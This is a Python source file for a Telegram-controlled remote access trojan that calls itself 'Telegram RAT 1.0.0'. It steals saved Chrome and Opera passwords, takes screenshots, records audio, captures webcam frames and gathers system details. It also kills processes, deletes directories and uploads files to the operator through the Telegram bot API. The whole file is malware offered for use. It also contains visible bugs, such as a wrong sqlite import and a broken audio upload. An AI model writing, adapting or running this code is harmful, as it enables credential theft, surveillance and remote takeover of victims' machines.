import telebot
import os
import requests
from PIL import ImageGrab
import shutil
import sqlite4
import win32crypt
import platform
import webbrowser
import time
import subprocess
import cv2
import sys
import wave
import pyaudio


bot_token = " " # YOUR BOT TOKEN
chat_id = " " # YOUR USER ID
bot = telebot.TeleBot(bot_token)

def Chrome():
    text = '\nPasswords Chrome:' + '\n'
    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data'):
        shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')

        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(result[2])[1].decode()
            login = result[1]
            url = result[0]
            if password != '':
                text += '\nURL: ' + url + '\nLOGIN: ' + login + '\nPASSWORD: ' + password + '\n'
    return text
file = open(os.getenv("APPDATA") + '\\passwords_chrome.txt', "w+") #
file.write(str(Chrome()) + '\n')
file.close()

def function():
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100
    RECORD_SECONDS = 60
    WAVE_OUTPUT_FILENAME = "a45133b44db5bb.wav"

    p = pyaudio.PyAudio()

    stream = p.open(format=FORMAT,
                channels=CHANNELS,
                rate=RATE,
                input=True,
                frames_per_buffer=CHUNK)

    bot.send_message(chat_id, "Recording (60 seconds)...")

    frames = []

    for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(data)

    bot.send_message(chat_id, "Done recording, please wait a few minutes")

    stream.stop_stream()
    stream.close()
    p.terminate()

    wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()

@bot.message_handler(commands=['/audio', 'Audio'])
def send_audio(message):
    function()
    files = {'document': open(os.getenv(WAVE_OUTPUT_FILENAME), 'wb')}
    requests.post("https://api.telegram.org/bot" + bot_token + "/sendDocument?chat_id=" + chat_id , files=files)

def webca():
    cap = cv2.VideoCapture(0)
    for i in range(30):
        cap.read()
    ret, frame = cap.read()
    cv2.imwrite('photo.png', frame)
    cap.release()

@bot.message_handler(commands=['passwords', 'Passwords']) # PASSWORDS
def send_passwords(message) :
    if ("{0}".format(message.text) == "/passwords chrome") : # If text /passwords chrome
        try:
            Chrome()
            bot.send_message(chat_id, "Wait...")
            files = {'document': open(os.getenv("APPDATA") + '\\passwords_chrome.txt','rb')}
            requests.post("https://api.telegram.org/bot" + bot_token + "/sendDocument?chat_id=" + chat_id , files=files)
        except:
            bot.send_message(chat_id, "Error! Browser maybe not installed, otherwise try again!")
    elif ("{0}".format(message.text) == "/passwords opera") : # Else if text /passwords opera
            Opera()
            bot.send_message(chat_id, "Wait...")
            files = {'document': open(os.getenv("APPDATA") + '\\passwords_opera.txt','rb')}
            requests.post("https://api.telegram.org/bot" + bot_token + "/sendDocument?chat_id=" + chat_id , files=files)
    else :
        bot.send_message(chat_id, "Error! Command entered incorrectly!")

def Opera():
    texto = '\nPasswords Opera:' + '\n'
    texto += 'URL | LOGIN | PASSWORD' + '\n'
    if os.path.exists(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data'):
        shutil.copy2(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data', os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data2')
        conn = sqlite3.connect(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data2')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(result[2])[1].decode()
            login = result[1]
            url = result[0]
            if password != '':
                texto += '\nURL: ' + url + '\nLOGIN: ' + login + '\nPASSWORD: ' + password + '\n'
file = open(os.getenv("APPDATA") + '\\passwords_opera.txt', "w+")
file.write(str(Opera()) + '\n')
file.close()

@bot.message_handler(commands=['start', 'Start'])
def send_message(command):
    bot.send_message(chat_id, "Telegram RAT 1.0.0 [ALPHA]" +
                     "\nCredits to @Drexy2" +
                     "\n\nTo see a list of commands, type /help")

@bot.message_handler(commands=['screen', 'Screen'])
def send_screen(command) :
    bot.send_message(chat_id, "Wait...")
    screen = ImageGrab.grab()
    screen.save(os.getenv("APPDATA") + '\\9e85f2409de8cc529.jpg')
    screen = open(os.getenv("APPDATA") + '\\9e85f2409de8cc529.jpg', 'rb')
    files = {'photo': screen}
    requests.post("https://api.telegram.org/bot" + bot_token + "/sendPhoto?chat_id=" + chat_id , files=files)

@bot.message_handler(commands=['help', 'commands', 'Help', 'Commands'])
def send_help(command):
    bot.send_message(chat_id, "Commands: \n /Screen - Take a screenshot \n /Check - User information \n /killprocess process.exe - Kills a process according to the name" +
                    "\n /Direct - Get the current working directory " +
                    "\n /Cmd - Execute Cmd  \n /Openurl - Opens URL in browser \n /Ls - Lists files in directory" +
                    "\n /Cd (directory) changes working directory \n /Download - Downloads file \n /Deldir - Deletes directory" +
                    "\n /passwords chrome - Get all chrome passwords! \n /passwords opera - Get all opera passwords!  ")

@bot.message_handler(commands=['check', 'Check']) # INFORMATION
def send_info(command) :
    username = os.getlogin()

    r = requests.get('http://ip.42.pl/raw')
    IP = r.text
    windows = platform.platform()
    processor = platform.processor()
    systemali = platform.version()
    bot.send_message(chat_id, "PC: " + username + "\nIP: " + IP + "\nOS: " + windows +
        "\nProcessor: " + processor + "\nVersion OS : " + systemali)

@bot.message_handler(commands=['direct', 'Direct']) # DIRECTORY
def direct(command) :
    directory = os.path.abspath(os.getcwd())
    bot.send_message(chat_id, "Current Directory: \n" + (str(directory)))

@bot.message_handler(commands=["killprocess", "Killprocess"]) # END PROCESS
def killprocess(message):
 try:
    user_msg = "{0}".format(message.text)
    subprocess.call("taskkill /IM " + user_msg.split(" ")[1])
    bot.send_message(chat_id, "Готово!")
 except:
     bot.send_message(chat_id, "Error! Process name entered incorrectly!")

@bot.message_handler(commands=["cmd", "Cmd"]) # CMD
def cmdopen(message) :
	subprocess.call("cmd")
	bot.send_message(chat_id, "Готово!") # Send a command

@bot.message_handler(commands=["openurl", "Openurl"]) # OPEN LINK
def openurl(message):
 try:
    user_msg = "{0}".format(message.text)
    url = user_msg.split(" ")[1]
    webbrowser.open_new_tab(url)
    bot.send_message(chat_id, "Ready!")
 except:
        bot.send_message(chat_id, "Error! Link entered incorrectly!")

@bot.message_handler(commands=["ls", "Ls"]) # LIST DIRECTORY
def lsdir(commands):
 try:
     dirs = '\n'.join(os.listdir(path="."))
     bot.send_message(chat_id, "Files: " + "\n" + dirs)
 except:
     bot.send_message(chat_id, "Error! File name entered incorrectly!")

@bot.message_handler(commands=["cd", "Cd"]) # CHANGE DIRECTORY
def cddir(message):
 try:
    user_msg = "{0}".format(message.text) # A variable that receives a message from the user
    folder = user_msg.split(" ")[1]
    os.chdir(folder)
    bot.send_message(chat_id, "Directory changed to " + folder)
 except:
     bot.send_message(chat_id, "Error! Directory name entered incorrectly!")

@bot.message_handler(commands =["Download", "download"]) # File upload
def downloadfile(message):
 try:
    user_msg = "{0}".format(message.text)
    docc = user_msg.split(" ")[1] # Variable containing the name of the file
    doccc = {'document': open(docc,'rb')} # Variable for POST request
    requests.post("https://api.telegram.org/bot" + bot_token + "/sendDocument?chat_id=" + chat_id , files=doccc) # Download file
 except:
     bot.send_message(chat_id, "Error! File name entered incorrectly!")

@bot.message_handler(commands = ["deldir", "Deldir"]) # DELETE DIRECTORY
def deletedir(message):
 try:
    user_msg = "{0}".format(message.text) # A variable that receives a message from the user
    path2del = user_msg.split(" ")[1]
    os.removedirs(path2del)
    bot.send_message(chat_id, "Directory " + path2del + " removed")
 except:
     bot.send_message(chat_id, "Error! Directory name entered incorrectly!")

bot.polling()
